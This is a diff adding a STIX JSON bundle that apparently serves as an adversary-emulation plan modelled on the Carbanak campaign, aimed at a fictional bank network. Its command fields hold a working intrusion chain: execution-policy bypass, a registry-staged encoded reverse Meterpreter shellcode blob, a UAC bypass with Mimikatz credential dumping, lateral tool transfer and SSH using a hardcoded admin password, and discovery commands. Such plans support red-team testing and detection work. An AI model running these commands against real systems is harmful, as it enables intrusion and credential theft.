@@ -1,0 +1,1324 @@
+{
+    "type": "bundle",
+    "id": "bundle--91d66bc9-891b-4914-82d1-4bb546703fe1",
+    "objects": [
+        {
+            "type": "campaign",
+            "spec_version": "2.1",
+            "id": "campaign--186b4d47-f4c0-48cb-9688-887070db45f1",
+            "created": "2024-02-03T18:17:42.675092Z",
+            "modified": "2024-02-03T18:17:42.675092Z",
+            "name": "Carbanak",
+            "description": "An advanced attacker targeting financial institutions"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--453cb643-892b-475d-8db9-df61289749f1",
+            "created": "2024-02-03T18:17:42.675701Z",
+            "modified": "2024-02-03T18:17:42.675701Z",
+            "name": "Screen Capture",
+            "description": "Download screen capture PowerShell script to target and execute",
+            "extensions": {
+                "extension-definition--dd8b1d41-6580-411f-bdbb-95f0bbfe4e78": {
+                    "attack_id": "T1113",
+                    "input_arguments": {
+                        "server": {
+                            "default": "192.0.2.10",
+                            "description": "IP or Hostname of server",
+                            "type": "string"
+                        }
+                    },
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "cleanup": "Remove-Item -Force screenshot__.png\n",
+                                "command": "powershell.exe -ExecutionPolicy Bypass -File .\\take-screenshot.ps1\n",
+                                "payloads": [
+                                    "take-screenshot.ps1"
+                                ]
+                            }
+                        }
+                    },
+                    "technique_name": "Screen Capture"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--48b64fcc-6fee-42fc-a317-81a5c94fb6d2",
+            "created": "2024-02-03T18:17:42.679146Z",
+            "modified": "2024-02-03T18:17:42.679146Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--453cb643-892b-475d-8db9-df61289749f1",
+            "target_ref": "ipv4-addr--a2fbe2c6-009e-52e0-b452-90b71e3109c2"
+        },
+        {
+            "type": "ipv4-addr",
+            "spec_version": "2.1",
+            "id": "ipv4-addr--a2fbe2c6-009e-52e0-b452-90b71e3109c2",
+            "value": "192.0.2.10"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--a3b4b83a-a360-4427-9278-9effb9ce6aac",
+            "created": "2024-02-03T18:17:42.679696Z",
+            "modified": "2024-02-03T18:17:42.679696Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--186b4d47-f4c0-48cb-9688-887070db45f1",
+            "target_ref": "attack-pattern--453cb643-892b-475d-8db9-df61289749f1"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--e238f1b5-a4e7-464d-82eb-36d0cc875434",
+            "created": "2024-02-03T18:17:42.681012Z",
+            "modified": "2024-02-03T18:17:42.681012Z",
+            "name": "Stage 2nd Stage RAT",
+            "description": "The shellcode for the 2nd stage RAT, which is a reverse Meterpreter shell, is written to the Registry",
+            "extensions": {
+                "extension-definition--dd8b1d41-6580-411f-bdbb-95f0bbfe4e78": {
+                    "attack_id": "T1112",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "command": "cmd.exe /c 'REG ADD \"HKCU\\Software\\InternetExplorer\\AppDataLow\\Software\\Microsoft\\InternetExplorer\" /f /v \"{018247B2CAC14652E}\" /t REG_SZ /d H4sIAJEshl4C/2sx/Dmnc9KWyqoKC21LTQ1NfSPP1fIGnzQkDD9qJRp91o4y+MShYVh63tjA1GOzgceuK67SLNVhERa7N5ZYV+6YMVXbWhOoMvKjlatR5UqZn4xJxdWlf7mrKio//vgIJI3+7uSTN6xeofnRINHus2WUYcWq2fpG7RusP/t+MqhYAzUTaprTDJ5ukyqzmEJ7xxX8CxSB6uOA6uUsPpYYAtlpQLblp7oPQNMslCwVVRSVrRUslC2VjX5PjbLUbp2haK2obPQ5e7JxW2u7ivExPk4vNU+vyipLfeOP841+Tr1VWVll+GG+4dGKirRXOy5W1VjoGX6YZ/Kh2/KwGX98bfsas4+ThSorqioUrA8F/BKubF0rXGCprqVh4r3RxHuHYesOw8+7wOROiwOTypbOaFtv8GGvUKa1gunnWYafGy0OPLzDJ9m2HujfIoPWbTzzJ7wCef/31CyDDzOA3hSqtVYAK6tasEm9bf3vxio2HaPfe6PUPvQIWVorClZlAJ2qaPSx28hzg/UhxXvac1rXGn7ebfB5P9ABBp87DD8vQtXOGqhkqacsUGlVUWmtIFylZHGgOKzUo229PtD9PCKmEq1rgc6Y4Nbe1mpQsdMgYI/Bnx7es9bt85SEKpUN9+3oOHNDr209AOpTVHH+AQAA'\n"
+                            }
+                        }
+                    },
+                    "technique_name": "Modify Registry"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--49379508-ab10-4545-b7cc-2a86f7ed188e",
+            "created": "2024-02-03T18:17:42.681474Z",
+            "modified": "2024-02-03T18:17:42.681474Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--186b4d47-f4c0-48cb-9688-887070db45f1",
+            "target_ref": "attack-pattern--e238f1b5-a4e7-464d-82eb-36d0cc875434"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--50cf48b9-2076-4efc-80f1-5b8f421ecae4",
+            "created": "2024-02-03T18:17:42.681865Z",
+            "modified": "2024-02-03T18:17:42.681865Z",
+            "name": "Execute 2nd Stage RAT",
+            "description": "A PowerShell script is used to execute the staged 2nd stage RAT, which is a reverse Meterpreter shell",
+            "extensions": {
+                "extension-definition--dd8b1d41-6580-411f-bdbb-95f0bbfe4e78": {
+                    "attack_id": "T1140",
+                    "input_arguments": {
+                        "domain.admin.username": {
+                            "default": "kmitnick",
+                            "description": "Username of domain administrator",
+                            "type": "string"
+                        },
+                        "domain.name.short": {
+                            "default": "financial",
+                            "description": "Short name of the domain",
+                            "type": "string"
+                        }
+                    },
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "cleanup": "Remove-Item -Force LanCradDriver.ps1\n",
+                                "command": "Move-Item reverse.ps1 LanCradDriver.ps1;\npowershell.exe -ExecutionPolicy Bypass -NoExit -File LanCradDriver.ps1\n",
+                                "payloads": [
+                                    "reverse.ps1"
+                                ]
+                            }
+                        }
+                    },
+                    "technique_name": "Deobfuscate/Decode Files or Information"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--f38ce0c3-0e29-4b5e-b3c9-c8ab20c39ec5",
+            "created": "2024-02-03T18:17:42.682642Z",
+            "modified": "2024-02-03T18:17:42.682642Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--50cf48b9-2076-4efc-80f1-5b8f421ecae4",
+            "target_ref": "domain-name--5399d219-b2e2-5533-b636-b294467ba42b"
+        },
+        {
+            "type": "domain-name",
+            "spec_version": "2.1",
+            "id": "domain-name--5399d219-b2e2-5533-b636-b294467ba42b",
+            "value": "financial"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--974793ff-8906-4983-9b16-673781352600",
+            "created": "2024-02-03T18:17:42.683418Z",
+            "modified": "2024-02-03T18:17:42.683418Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--50cf48b9-2076-4efc-80f1-5b8f421ecae4",
+            "target_ref": "user-account--ae5130fe-3c4d-5fe6-8a31-a779d76d4ed9"
+        },
+        {
+            "type": "user-account",
+            "spec_version": "2.1",
+            "id": "user-account--ae5130fe-3c4d-5fe6-8a31-a779d76d4ed9",
+            "account_login": "kmitnick"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--cb3f9229-f5f9-41a9-931a-baa7628ba891",
+            "created": "2024-02-03T18:17:42.683777Z",
+            "modified": "2024-02-03T18:17:42.683777Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--186b4d47-f4c0-48cb-9688-887070db45f1",
+            "target_ref": "attack-pattern--50cf48b9-2076-4efc-80f1-5b8f421ecae4"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--473e5707-5786-4f53-934f-22175c1059b0",
+            "created": "2024-02-03T18:17:42.684124Z",
+            "modified": "2024-02-03T18:17:42.684124Z",
+            "name": "UAC Bypass and Credential Dumping",
+            "description": "A UAC Bypass script and modified Mimikatz are uploaded to current directory and executed",
+            "extensions": {
+                "extension-definition--dd8b1d41-6580-411f-bdbb-95f0bbfe4e78": {
+                    "attack_id": "T1003.001",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "cleanup": "Remove-Item -Force smrs.exe;\nRemove-Item -Force MGsCOxPSNK.txt\n",
+                                "command": "Move-Item attackkatz.exe smrs.exe;\npowershell.exe -ExecutionPolicy Bypass -File uac-bypass.ps1 \"cmd.exe /C $pwd\\smrs.exe > $pwd\\MGsCOxPSNK.txt\"\n",
+                                "payloads": [
+                                    "uac-bypass.ps1",
+                                    "attackkatz.exe"
+                                ]
+                            }
+                        }
+                    },
+                    "technique_name": "OS Credential Dumping: LSASS Memory"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--b8f6356e-bbee-4629-a0bd-b5c1b06aaa8a",
+            "created": "2024-02-03T18:17:42.684464Z",
+            "modified": "2024-02-03T18:17:42.684464Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--186b4d47-f4c0-48cb-9688-887070db45f1",
+            "target_ref": "attack-pattern--473e5707-5786-4f53-934f-22175c1059b0"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--31e07036-7e57-4405-854e-827b9ef8b434",
+            "created": "2024-02-03T18:17:42.684992Z",
+            "modified": "2024-02-03T18:17:42.684992Z",
+            "name": "Read Dumped Credentials",
+            "description": "Read the dumped credentials from the previous UAC Bypass and Credential Dumping step",
+            "extensions": {
+                "extension-definition--dd8b1d41-6580-411f-bdbb-95f0bbfe4e78": {
+                    "attack_id": "T1003.001",
+                    "input_arguments": null,
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "command": "cat MGsCOxPSNK.txt;\n"
+                            }
+                        }
+                    },
+                    "technique_name": "OS Credential Dumping: LSASS Memory"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--2dc58a93-7fb4-4e9f-b9ca-6f977cf65fb0",
+            "created": "2024-02-03T18:17:42.685528Z",
+            "modified": "2024-02-03T18:17:42.685528Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--186b4d47-f4c0-48cb-9688-887070db45f1",
+            "target_ref": "attack-pattern--31e07036-7e57-4405-854e-827b9ef8b434"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--8bd3edc3-14ad-4e44-9e45-9ec8d43f374b",
+            "created": "2024-02-03T18:17:42.685953Z",
+            "modified": "2024-02-03T18:17:42.685953Z",
+            "name": "Upload Tools for Lateral Movement",
+            "description": "Tools required for lateral movement are uploaded and moved to the expected directory.",
+            "extensions": {
+                "extension-definition--dd8b1d41-6580-411f-bdbb-95f0bbfe4e78": {
+                    "attack_id": "T1105",
+                    "input_arguments": {
+                        "domain.admin.username": {
+                            "default": "kmitnick",
+                            "description": "Username of domain administrator",
+                            "type": "string"
+                        },
+                        "domain.name.short": {
+                            "default": "financial",
+                            "description": "Short name of the domain",
+                            "type": "string"
+                        }
+                    },
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "cleanup": "Remove-Item -Force C:\\Users\\#{domain.admin.username}.#{domain.name.short}\\AppData\\Roaming\\TransbaseOdbcDriver\\pscp.exe;\nRemove-Item -Force C:\\Users\\#{domain.admin.username}.#{domain.name.short}\\AppData\\Roaming\\TransbaseOdbcDriver\\psexec.py;\nRemove-Item -Force C:\\Users\\#{domain.admin.username}.#{domain.name.short}\\AppData\\Roaming\\TransbaseOdbcDriver\\runtime;\nRemove-Item -Force C:\\Users\\#{domain.admin.username}.#{domain.name.short}\\AppData\\Roaming\\TransbaseOdbcDriver\\plink.exe;\nRemove-Item -Force C:\\Users\\#{domain.admin.username}.#{domain.name.short}\\AppData\\Roaming\\TransbaseOdbcDriver\\tiny.exe\n",
+                                "command": "New-Item -ItemType Directory -Force C:\\Users\\#{domain.admin.username}.#{domain.name.short}\\AppData\\Roaming\\TransbaseOdbcDriver;\nMove-Item pscp.exe C:\\Users\\#{domain.admin.username}.#{domain.name.short}\\AppData\\Roaming\\TransbaseOdbcDriver\\pscp.exe;\nMove-Item psexec.py C:\\Users\\#{domain.admin.username}.#{domain.name.short}\\AppData\\Roaming\\TransbaseOdbcDriver\\psexec.py;\nMove-Item impacket_exe C:\\Users\\#{domain.admin.username}.#{domain.name.short}\\AppData\\Roaming\\TransbaseOdbcDriver\\runtime;\nMove-Item plink.exe C:\\Users\\#{domain.admin.username}.#{domain.name.short}\\AppData\\Roaming\\TransbaseOdbcDriver\\plink.exe;\nMove-Item tiny.exe C:\\Users\\#{domain.admin.username}.#{domain.name.short}\\AppData\\Roaming\\TransbaseOdbcDriver\\tiny.exe;\n",
+                                "payloads": [
+                                    "pscp.exe",
+                                    "psexec.py",
+                                    "impacket_exe",
+                                    "plink.exe",
+                                    "tiny.exe"
+                                ]
+                            }
+                        }
+                    },
+                    "technique_name": "Ingress Tool Transfer"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--791d344e-ecc5-416d-8917-bf58a2f68b09",
+            "created": "2024-02-03T18:17:42.686741Z",
+            "modified": "2024-02-03T18:17:42.686741Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--8bd3edc3-14ad-4e44-9e45-9ec8d43f374b",
+            "target_ref": "domain-name--5399d219-b2e2-5533-b636-b294467ba42b"
+        },
+        {
+            "type": "domain-name",
+            "spec_version": "2.1",
+            "id": "domain-name--5399d219-b2e2-5533-b636-b294467ba42b",
+            "value": "financial"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--045019e0-162f-492b-90cd-b4adeaacddd1",
+            "created": "2024-02-03T18:17:42.687735Z",
+            "modified": "2024-02-03T18:17:42.687735Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--8bd3edc3-14ad-4e44-9e45-9ec8d43f374b",
+            "target_ref": "user-account--ae5130fe-3c4d-5fe6-8a31-a779d76d4ed9"
+        },
+        {
+            "type": "user-account",
+            "spec_version": "2.1",
+            "id": "user-account--ae5130fe-3c4d-5fe6-8a31-a779d76d4ed9",
+            "account_login": "kmitnick"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--daf97bb0-eb44-4473-93de-928b87ee7864",
+            "created": "2024-02-03T18:17:42.688073Z",
+            "modified": "2024-02-03T18:17:42.688073Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--186b4d47-f4c0-48cb-9688-887070db45f1",
+            "target_ref": "attack-pattern--8bd3edc3-14ad-4e44-9e45-9ec8d43f374b"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--4983721e-9633-4e33-bc2f-b4e9f58336a0",
+            "created": "2024-02-03T18:17:42.690772Z",
+            "modified": "2024-02-03T18:17:42.690772Z",
+            "name": "Lateral Tool Transfer",
+            "description": "Previously uploaded tools are transferred to bankfileserver using pscp.exe",
+            "extensions": {
+                "extension-definition--dd8b1d41-6580-411f-bdbb-95f0bbfe4e78": {
+                    "attack_id": "T1570",
+                    "input_arguments": {
+                        "domain.admin.username": {
+                            "default": "kmitnick",
+                            "description": "Username of domain administrator",
+                            "type": "string"
+                        },
+                        "bankfileserver.ip.address": {
+                            "default": "10.0.0.7",
+                            "description": "IP address of bankfileserver",
+                            "type": "string"
+                        },
+                        "domain.name.short": {
+                            "default": "financial",
+                            "description": "Short name of the domain",
+                            "type": "string"
+                        },
+                        "domain.admin.password": {
+                            "default": "79a&LbjM@MlW8XZa",
+                            "description": "Password of domain administrator",
+                            "type": "string"
+                        }
+                    },
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "command": "C:\\Users\\#{domain.admin.username}.#{domain.name.short}\\AppData\\Roaming\\TransbaseOdbcDriver\\pscp.exe -scp -pw \"#{domain.admin.password}\" C:\\Users\\#{domain.admin.username}.#{domain.name.short}\\AppData\\Roaming\\TransbaseOdbcDriver\\psexec.py #{domain.admin.username}@#{bankfileserver.ip.address}:/tmp/psexec.py;\nC:\\Users\\#{domain.admin.username}.#{domain.name.short}\\AppData\\Roaming\\TransbaseOdbcDriver\\pscp.exe -scp -pw \"#{domain.admin.password}\" C:\\Users\\#{domain.admin.username}.#{domain.name.short}\\AppData\\Roaming\\TransbaseOdbcDriver\\runtime #{domain.admin.username}@#{bankfileserver.ip.address}:/tmp/runtime;\nC:\\Users\\#{domain.admin.username}.#{domain.name.short}\\AppData\\Roaming\\TransbaseOdbcDriver\\pscp.exe -scp -pw \"#{domain.admin.password}\" C:\\Users\\#{domain.admin.username}.#{domain.name.short}\\AppData\\Roaming\\TransbaseOdbcDriver\\tiny.exe #{domain.admin.username}@#{bankfileserver.ip.address}:/tmp/tiny;\n"
+                            }
+                        }
+                    },
+                    "technique_name": "Lateral Tool Transfer"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--2ea33f71-0c97-4ffc-adb3-7902959aba8c",
+            "created": "2024-02-03T18:17:42.691953Z",
+            "modified": "2024-02-03T18:17:42.691953Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--4983721e-9633-4e33-bc2f-b4e9f58336a0",
+            "target_ref": "domain-name--5399d219-b2e2-5533-b636-b294467ba42b"
+        },
+        {
+            "type": "domain-name",
+            "spec_version": "2.1",
+            "id": "domain-name--5399d219-b2e2-5533-b636-b294467ba42b",
+            "value": "financial"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--995a6074-3c57-4c04-bf46-9646b166094a",
+            "created": "2024-02-03T18:17:42.712103Z",
+            "modified": "2024-02-03T18:17:42.712103Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--4983721e-9633-4e33-bc2f-b4e9f58336a0",
+            "target_ref": "user-account--ae5130fe-3c4d-5fe6-8a31-a779d76d4ed9"
+        },
+        {
+            "type": "user-account",
+            "spec_version": "2.1",
+            "id": "user-account--ae5130fe-3c4d-5fe6-8a31-a779d76d4ed9",
+            "account_login": "kmitnick"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--18a9454a-b390-41a1-b3f6-91f8db2d2420",
+            "created": "2024-02-03T18:17:42.713942Z",
+            "modified": "2024-02-03T18:17:42.713942Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--4983721e-9633-4e33-bc2f-b4e9f58336a0",
+            "target_ref": "user-account--49fcf0e1-4929-4fa5-bc78-fcf67f9b4604"
+        },
+        {
+            "type": "user-account",
+            "spec_version": "2.1",
+            "id": "user-account--49fcf0e1-4929-4fa5-bc78-fcf67f9b4604",
+            "credential": "79a&LbjM@MlW8XZa"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--7fc2270b-16c7-4918-bb3d-3709ec4cb11a",
+            "created": "2024-02-03T18:17:42.715256Z",
+            "modified": "2024-02-03T18:17:42.715256Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--4983721e-9633-4e33-bc2f-b4e9f58336a0",
+            "target_ref": "ipv4-addr--fa32103b-4f54-55f5-9649-a135ed962131"
+        },
+        {
+            "type": "ipv4-addr",
+            "spec_version": "2.1",
+            "id": "ipv4-addr--fa32103b-4f54-55f5-9649-a135ed962131",
+            "value": "10.0.0.7"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--4ce1df1f-cbe4-4970-810a-a0f8de0ab1bb",
+            "created": "2024-02-03T18:17:42.715762Z",
+            "modified": "2024-02-03T18:17:42.715762Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--186b4d47-f4c0-48cb-9688-887070db45f1",
+            "target_ref": "attack-pattern--4983721e-9633-4e33-bc2f-b4e9f58336a0"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--51da22bc-a6a4-4d60-95ab-d61af87a23d0",
+            "created": "2024-02-03T18:17:42.716168Z",
+            "modified": "2024-02-03T18:17:42.716168Z",
+            "name": "SSH to bankfileserver",
+            "description": "Use plink.exe to SSH into bankfileserver",
+            "extensions": {
+                "extension-definition--dd8b1d41-6580-411f-bdbb-95f0bbfe4e78": {
+                    "attack_id": "T1021.004",
+                    "input_arguments": {
+                        "domain.admin.username": {
+                            "default": "kmitnick",
+                            "description": "Username of domain administrator",
+                            "type": "string"
+                        },
+                        "bankfileserver.ip.address": {
+                            "default": "10.0.0.7",
+                            "description": "IP address of bankfileserver",
+                            "type": "string"
+                        },
+                        "domain.name.short": {
+                            "default": "financial",
+                            "description": "Short name of the domain",
+                            "type": "string"
+                        },
+                        "domain.admin.password": {
+                            "default": "79a&LbjM@MlW8XZa",
+                            "description": "Password of domain administrator",
+                            "type": "string"
+                        }
+                    },
+                    "platforms": {
+                        "windows": {
+                            "psh,pwsh": {
+                                "command": "C:\\Users\\#{domain.admin.username}.#{domain.name.short}\\AppData\\Roaming\\TransbaseOdbcDriver\\plink.exe #{domain.admin.username}@#{bankfileserver.ip.address} -pw #{domain.admin.password}\n"
+                            }
+                        }
+                    },
+                    "technique_name": "Remote Services: SSH"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--8ffaabf8-8e30-44b3-abe1-76ec92788870",
+            "created": "2024-02-03T18:17:42.717026Z",
+            "modified": "2024-02-03T18:17:42.717026Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--51da22bc-a6a4-4d60-95ab-d61af87a23d0",
+            "target_ref": "domain-name--5399d219-b2e2-5533-b636-b294467ba42b"
+        },
+        {
+            "type": "domain-name",
+            "spec_version": "2.1",
+            "id": "domain-name--5399d219-b2e2-5533-b636-b294467ba42b",
+            "value": "financial"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--d34a5b8c-2792-4016-8b49-148e4ad13080",
+            "created": "2024-02-03T18:17:42.717971Z",
+            "modified": "2024-02-03T18:17:42.717971Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--51da22bc-a6a4-4d60-95ab-d61af87a23d0",
+            "target_ref": "user-account--ae5130fe-3c4d-5fe6-8a31-a779d76d4ed9"
+        },
+        {
+            "type": "user-account",
+            "spec_version": "2.1",
+            "id": "user-account--ae5130fe-3c4d-5fe6-8a31-a779d76d4ed9",
+            "account_login": "kmitnick"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--83dc0b61-68fd-4a1d-a886-f153d6a1e9c1",
+            "created": "2024-02-03T18:17:42.719433Z",
+            "modified": "2024-02-03T18:17:42.719433Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--51da22bc-a6a4-4d60-95ab-d61af87a23d0",
+            "target_ref": "user-account--161eaef0-6dc9-43d9-8361-820a4417e004"
+        },
+        {
+            "type": "user-account",
+            "spec_version": "2.1",
+            "id": "user-account--161eaef0-6dc9-43d9-8361-820a4417e004",
+            "credential": "79a&LbjM@MlW8XZa"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--e9109a84-7a42-4574-8229-236f3fb44c73",
+            "created": "2024-02-03T18:17:42.720687Z",
+            "modified": "2024-02-03T18:17:42.720687Z",
+            "relationship_type": "uses",
+            "source_ref": "attack-pattern--51da22bc-a6a4-4d60-95ab-d61af87a23d0",
+            "target_ref": "ipv4-addr--fa32103b-4f54-55f5-9649-a135ed962131"
+        },
+        {
+            "type": "ipv4-addr",
+            "spec_version": "2.1",
+            "id": "ipv4-addr--fa32103b-4f54-55f5-9649-a135ed962131",
+            "value": "10.0.0.7"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--17adb051-05e4-4ef5-9bee-8bdbe564508b",
+            "created": "2024-02-03T18:17:42.721411Z",
+            "modified": "2024-02-03T18:17:42.721411Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--186b4d47-f4c0-48cb-9688-887070db45f1",
+            "target_ref": "attack-pattern--51da22bc-a6a4-4d60-95ab-d61af87a23d0"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--9c5d756e-c72a-40d0-838d-3ace6cc96a09",
+            "created": "2024-02-03T18:17:42.721904Z",
+            "modified": "2024-02-03T18:17:42.721904Z",
+            "name": "Process Discovery on bankfileserver",
+            "description": "Processes are listed on bankfileserver",
+            "extensions": {
+                "extension-definition--dd8b1d41-6580-411f-bdbb-95f0bbfe4e78": {
+                    "attack_id": "T1057",
+                    "input_arguments": null,
+                    "platforms": {
+                        "linux": {
+                            "sh": {
+                                "command": "ps ax\n"
+                            }
+                        }
+                    },
+                    "technique_name": "Process Discovery"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--2fe31b55-5ae3-485f-a29d-167ce4402288",
+            "created": "2024-02-03T18:17:42.722623Z",
+            "modified": "2024-02-03T18:17:42.722623Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--186b4d47-f4c0-48cb-9688-887070db45f1",
+            "target_ref": "attack-pattern--9c5d756e-c72a-40d0-838d-3ace6cc96a09"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--da810df4-c1c2-48f1-a29a-765098acec17",
+            "created": "2024-02-03T18:17:42.723778Z",
+            "modified": "2024-02-03T18:17:42.723778Z",
+            "name": "File and Directory Discovery on bankfileserver",
+            "description": "List directories and files within the /var/ directory on bankfileserver",
+            "extensions": {
+                "extension-definition--dd8b1d41-6580-411f-bdbb-95f0bbfe4e78": {
+                    "attack_id": "T1083",
+                    "input_arguments": null,
+                    "platforms": {
+                        "linux": {
+                            "sh": {
+                                "command": "ls -lsahR /var/ 2>/dev/null\n"
+                            }
+                        }
+                    },
+                    "technique_name": "File and Directory Discovery"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--ec24d6c5-181e-48ca-99e1-c630ee8d820e",
+            "created": "2024-02-03T18:17:42.72441Z",
+            "modified": "2024-02-03T18:17:42.72441Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--186b4d47-f4c0-48cb-9688-887070db45f1",
+            "target_ref": "attack-pattern--da810df4-c1c2-48f1-a29a-765098acec17"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--9ec26b39-9d77-4a3d-b309-8c819a2f59e7",
+            "created": "2024-02-03T18:17:42.724922Z",
+            "modified": "2024-02-03T18:17:42.724922Z",
+            "name": "Data from Local System on bankfileserver 1",
+            "description": "Read files within the /var/tmp/ directory on bankfileserver 1",
+            "extensions": {
+                "extension-definition--dd8b1d41-6580-411f-bdbb-95f0bbfe4e78": {
+                    "attack_id": "T1005",
+                    "input_arguments": null,
+                    "platforms": {
+                        "linux": {
+                            "sh": {
+                                "command": "cat /var/tmp/network-diagram-financial.xml\n"
+                            }
+                        }
+                    },
+                    "technique_name": "Data from Local System"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--cd9eafcd-2cb0-40fd-9fba-9c72bc9b1f2b",
+            "created": "2024-02-03T18:17:42.725936Z",
+            "modified": "2024-02-03T18:17:42.725936Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--186b4d47-f4c0-48cb-9688-887070db45f1",
+            "target_ref": "attack-pattern--9ec26b39-9d77-4a3d-b309-8c819a2f59e7"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--f87e0022-4c82-447f-a0d2-52b2be030b6d",
+            "created": "2024-02-03T18:17:42.726544Z",
+            "modified": "2024-02-03T18:17:42.726544Z",
+            "name": "Data from Local System on bankfileserver 2",
+            "description": "Read files within the /var/tmp/ directory on bankfileserver 2",
+            "extensions": {
+                "extension-definition--dd8b1d41-6580-411f-bdbb-95f0bbfe4e78": {
+                    "attack_id": "T1005",
+                    "input_arguments": null,
+                    "platforms": {
+                        "linux": {
+                            "sh": {
+                                "command": "cat /var/tmp/help-desk-ticket.txt\n"
+                            }
+                        }
+                    },
+                    "technique_name": "Data from Local System"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--6121c7d5-93a3-4333-beac-ec8f391e2e3c",
+            "created": "2024-02-03T18:17:42.734332Z",
+            "modified": "2024-02-03T18:17:42.734332Z",
+            "relationship_type": "uses",
+            "source_ref": "campaign--186b4d47-f4c0-48cb-9688-887070db45f1",
+            "target_ref": "attack-pattern--f87e0022-4c82-447f-a0d2-52b2be030b6d"
+        },
+        {
+            "type": "attack-pattern",
+            "spec_version": "2.1",
+            "id": "attack-pattern--76c8f978-cc38-4281-8236-ecb7fae8f99c",
+            "created": "2024-02-03T18:17:42.735026Z",
+            "modified": "2024-02-03T18:17:42.735026Z",
+            "name": "Remote System Discovery on bankfileserver",
+            "description": "The nslookup utility is used to find the IP address of bankdc",
+            "extensions": {
+                "extension-definition--dd8b1d41-6580-411f-bdbb-95f0bbfe4e78": {
+                    "attack_id": "T1018",
+                    "input_arguments": null,
+                    "platforms": {
+                        "linux": {
+                            "sh": {
+                                "command": "nslookup bankdc\n"
+                            }
+                        }
+                    },
+                    "technique_name": "Remote System Discovery"
+                }
+            }
+        },
+        {
